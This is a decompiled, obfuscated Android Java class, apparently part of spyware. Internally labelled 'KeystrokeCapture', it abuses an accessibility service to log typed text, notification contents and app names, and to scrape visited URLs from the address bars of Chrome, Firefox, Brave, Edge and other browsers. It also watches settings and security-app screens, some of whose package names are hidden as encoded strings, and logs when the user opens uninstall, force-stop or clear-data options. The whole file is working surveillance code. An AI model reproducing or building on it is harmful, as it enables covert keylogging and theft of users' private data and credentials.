package com.storm.safe.rock.service.modules;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import okhttp3.HttpUrl;
import p000.AbstractC0715je;
import p000.AbstractC1262tj;
import p000.e90;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.a5 */
/* loaded from: classes2.dex */
public final class C0320a5 {

    /* renamed from: a6 */
    public static final Object f53076a6;

    /* renamed from: a0 */
    public final dqtvuisjd f53077a0;

    /* renamed from: a1 */
    public String f53078a1;

    /* renamed from: a2 */
    public String f53079a2;

    /* renamed from: a3 */
    public long f53080a3;

    /* renamed from: a4 */
    public final ConcurrentHashMap f53081a4;

    /* renamed from: a5 */
    public final AtomicBoolean f53082a5;

    static {
        new e90(null);
        f53076a6 = AbstractC0770a1.m213614f9(new Pair("com.android.chrome", "com.android.chrome:id/url_bar"), new Pair("org.mozilla.firefox", "org.mozilla.firefox:id/url_bar_title"), new Pair("com.sec.android.app.sbrowser", "com.sec.android.app.sbrowser:id/location_bar_edit_text"), new Pair("com.brave.browser", "com.brave.browser:id/url_bar"), new Pair("com.opera.browser", "com.opera.browser:id/url_field"), new Pair("com.opera.mini.native", "com.opera.mini.native:id/url_field"), new Pair("com.microsoft.emmx", "com.microsoft.emmx:id/url_bar"), new Pair("com.coloros.browser", "com.coloros.browser:id/azt"), new Pair("com.android.browser", "com.android.browser:id/url"), new Pair("com.duckduckgo.mobile.android", "com.duckduckgo.mobile.android:id/omnibarTextInput"));
    }

    public C0320a5(dqtvuisjd dqtvuisjdVar) {
        t60.m214695b6(dqtvuisjdVar, "service");
        this.f53077a0 = dqtvuisjdVar;
        this.f53078a1 = "";
        this.f53079a2 = "";
        this.f53081a4 = new ConcurrentHashMap();
        this.f53082a5 = new AtomicBoolean(false);
    }

    /* renamed from: a0 */
    public static void m211579a0(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        if (i <= 0) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && (string2 = text.toString()) != null && !AbstractC0779a1.m213663b6(string2)) {
            arrayList.add(string2);
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string = contentDescription.toString()) != null && !AbstractC0779a1.m213663b6(string)) {
            arrayList.add(string);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211579a0(i - 1, child, arrayList);
                child.recycle();
            }
        }
    }

    /* renamed from: a1 */
    public final String m211580a1(String str) {
        boolean andSet = this.f53082a5.getAndSet(true);
        ConcurrentHashMap concurrentHashMap = this.f53081a4;
        dqtvuisjd dqtvuisjdVar = this.f53077a0;
        if (!andSet) {
            try {
                Map<String, ?> all = dqtvuisjdVar.getSharedPreferences("app_name_cache", 0).getAll();
                t60.m214694b5(all, "prefs.all");
                for (Map.Entry<String, ?> entry : all.entrySet()) {
                    String key = entry.getKey();
                    Object value = entry.getValue();
                    if (value instanceof String) {
                        t60.m214694b5(key, "k");
                        concurrentHashMap.put(key, value);
                    }
                }
            } catch (Exception unused) {
            }
        }
        String str2 = (String) concurrentHashMap.get(str);
        if (str2 != null) {
            return str2;
        }
        String strM213684d7 = AbstractC0779a1.m213684d7(str, ".");
        AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new KeystrokeCapture$getAppName$1(this, str, strM213684d7, null), 2);
        return strM213684d7;
    }

    /* JADX WARN: Type inference failed for: r3v9, types: [java.lang.Object, java.util.Map] */
    /* renamed from: a2 */
    public final void m211581a2(String str, String str2) {
        boolean z;
        String str3;
        String string;
        String str4 = AbstractC0315a0.f53025a0;
        if (AbstractC0315a0.f53034a9 && !str.equals(this.f53078a1)) {
            if (this.f53078a1.length() > 0) {
                AbstractC0315a0.m211546a8(m211580a1(this.f53078a1), false);
            }
            AbstractC0315a0.m211546a8(str2, true);
            this.f53078a1 = str;
        }
        if (str.equals("com.android.settings") || str.equals(StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw==")) || str.equals(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM=")) || str.equals("com.bbk.VivoSafe") || str.equals(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo")) || str.equals("com.samsung.android.sm")) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - this.f53080a3 >= 10000) {
                this.f53080a3 = jCurrentTimeMillis;
                try {
                    AccessibilityNodeInfo rootInActiveWindow = this.f53077a0.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        ArrayList arrayList = new ArrayList();
                        m211579a0(3, rootInActiveWindow, arrayList);
                        rootInActiveWindow.recycle();
                        String strM213295i2 = AbstractC0715je.m213295i2(arrayList, " ", null, null, null, 62);
                        boolean z2 = AbstractC0779a1.m213652a5(strM213295i2, "卸载", false) || AbstractC0779a1.m213652a5(strM213295i2, "uninstall", true);
                        boolean z3 = AbstractC0779a1.m213652a5(strM213295i2, "清除数据", false) || AbstractC0779a1.m213652a5(strM213295i2, "清除全部数据", false) || AbstractC0779a1.m213652a5(strM213295i2, "clear data", true) || AbstractC0779a1.m213652a5(strM213295i2, "清空数据", false);
                        boolean z4 = AbstractC0779a1.m213652a5(strM213295i2, "清除缓存", false) || AbstractC0779a1.m213652a5(strM213295i2, "clear cache", true);
                        boolean z5 = AbstractC0779a1.m213652a5(strM213295i2, "强行停止", false) || AbstractC0779a1.m213652a5(strM213295i2, "force stop", true) || AbstractC0779a1.m213652a5(strM213295i2, "强制停止", false);
                        if (AbstractC0779a1.m213652a5(strM213295i2, "应用信息", false) || AbstractC0779a1.m213652a5(strM213295i2, "应用详情", false)) {
                            z = true;
                        } else {
                            z = true;
                            if (!AbstractC0779a1.m213652a5(strM213295i2, "app info", true)) {
                                z = false;
                            }
                        }
                        ArrayList arrayList2 = new ArrayList();
                        if (z2) {
                            arrayList2.add("卸载");
                        }
                        if (z3) {
                            arrayList2.add("清除数据");
                        }
                        if (z4) {
                            arrayList2.add("清除缓存");
                        }
                        if (z5) {
                            arrayList2.add("强行停止");
                        }
                        if (z) {
                            arrayList2.add("应用详情");
                        }
                        if (!arrayList2.isEmpty()) {
                            AbstractC0315a0.m211548b0("用户进入设置页面[" + AbstractC0715je.m213295i2(arrayList2, "+", null, null, null, 62) + "] pkg=" + str);
                        }
                    }
                } catch (Exception unused) {
                }
            }
        }
        String str5 = AbstractC0315a0.f53025a0;
        if (AbstractC0315a0.f53035b0) {
            ?? r3 = f53076a6;
            if (r3.containsKey(str)) {
                try {
                    AccessibilityNodeInfo rootInActiveWindow2 = this.f53077a0.getRootInActiveWindow();
                    if (rootInActiveWindow2 != null && (str3 = (String) r3.get(str)) != null) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow2.findAccessibilityNodeInfosByViewId(str3);
                        t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "urlNodes");
                        if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                            CharSequence text = listFindAccessibilityNodeInfosByViewId.get(0).getText();
                            if (text == null || (string = text.toString()) == null) {
                                string = "";
                            }
                            if (string.length() > 0 && (AbstractC0779a1.m213679d2(string, false, "http") || AbstractC0779a1.m213652a5(string, ".", false))) {
                                AbstractC0315a0.m211547a9(str2, string);
                            }
                            Iterator<T> it = listFindAccessibilityNodeInfosByViewId.iterator();
                            while (it.hasNext()) {
                                ((AccessibilityNodeInfo) it.next()).recycle();
                            }
                        }
                        rootInActiveWindow2.recycle();
                    }
                } catch (Exception unused2) {
                }
            }
        }
    }

    /* renamed from: a3 */
    public final void m211582a3(AccessibilityEvent accessibilityEvent, AccessibilityNodeInfo accessibilityNodeInfo) {
        CharSequence packageName;
        String string;
        String string2;
        List listM213289h6;
        CharSequence charSequence;
        String str = AbstractC0315a0.f53025a0;
        if ((!AbstractC0315a0.f53032a7 && !AbstractC0315a0.f53033a8 && !AbstractC0315a0.f53034a9 && !AbstractC0315a0.f53035b0) || (packageName = accessibilityEvent.getPackageName()) == null || (string = packageName.toString()) == null) {
            return;
        }
        String strM211580a1 = m211580a1(string);
        try {
            if (accessibilityEvent.getEventType() == 16 && (AbstractC0315a0.f53032a7 || AbstractC0315a0.f53033a8)) {
                AccessibilityNodeInfo source = accessibilityNodeInfo == null ? accessibilityEvent.getSource() : accessibilityNodeInfo;
                if (source != null) {
                    m211583a4(source, strM211580a1, accessibilityEvent.getEventType());
                    if (accessibilityNodeInfo == null) {
                        source.recycle();
                    }
                }
            }
            if (accessibilityEvent.getEventType() == 32) {
                m211581a2(string, strM211580a1);
            }
            if (accessibilityEvent.getEventType() == 64) {
                if (AbstractC0315a0.f53036b1) {
                    String strM213295i2 = "";
                    try {
                        List<CharSequence> text = accessibilityEvent.getText();
                        if (text == null || (charSequence = (CharSequence) AbstractC0715je.m213291h8(text)) == null || (string2 = charSequence.toString()) == null) {
                            string2 = "";
                        }
                        List<CharSequence> text2 = accessibilityEvent.getText();
                        if (text2 != null && (listM213289h6 = AbstractC0715je.m213289h6(text2)) != null) {
                            strM213295i2 = AbstractC0715je.m213295i2(listM213289h6, " ", null, null, null, 62);
                        }
                        if (string2.length() <= 0 && strM213295i2.length() <= 0) {
                            return;
                        }
                        if (AbstractC0315a0.f53036b1) {
                            AbstractC0315a0.m211543a5(ActivityMonitor$LogType.f52732a4, "[" + strM211580a1 + "] " + string2 + ": " + strM213295i2);
                        }
                    } catch (Exception unused) {
                    }
                }
            }
        } catch (Exception e) {
            tz0.m214807a7("处理事件失败: ", e.getMessage(), "KeystrokeCapture");
        }
    }

    /* renamed from: a4 */
    public final void m211583a4(AccessibilityNodeInfo accessibilityNodeInfo, String str, int i) {
        String string;
        String str2;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string = text.toString()) == null) {
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription == null) {
                    return;
                } else {
                    string = contentDescription.toString();
                }
            }
            String string2 = AbstractC0779a1.m213687e0(AbstractC0779a1.m213673c6(string, HttpUrl.PATH_SEGMENT_ENCODE_SET_URI, "")).toString();
            if (string2.length() != 0 && !string2.equals(this.f53079a2)) {
                this.f53079a2 = string2;
                if (i == 1) {
                    str2 = "CLICKED";
                } else if (i == 2) {
                    str2 = "LONG_CLICKED";
                } else if (i == 4) {
                    str2 = "SELECTED";
                } else if (i == 8) {
                    str2 = "FOCUSED";
                } else if (i == 16) {
                    str2 = "TEXT_CHANGED";
                } else if (i == 32) {
                    str2 = "WINDOW_CHANGED";
                } else if (i == 64) {
                    str2 = "NOTIFICATION";
                } else if (i == 128) {
                    str2 = "HOVER_ENTER";
                } else if (i != 256) {
                    str2 = "EVENT_" + i;
                } else {
                    str2 = "HOVER_EXIT";
                }
                String str3 = str + "|" + str2 + "|" + string2;
                String str4 = AbstractC0315a0.f53025a0;
                if (AbstractC0315a0.f53032a7) {
                    AbstractC0315a0.m211543a5(ActivityMonitor$LogType.f52729a1, str3);
                }
            }
        } catch (Exception e) {
            tz0.m214807a7("processTextEvent 异常: ", e.getMessage(), "KeystrokeCapture");
        }
    }
}
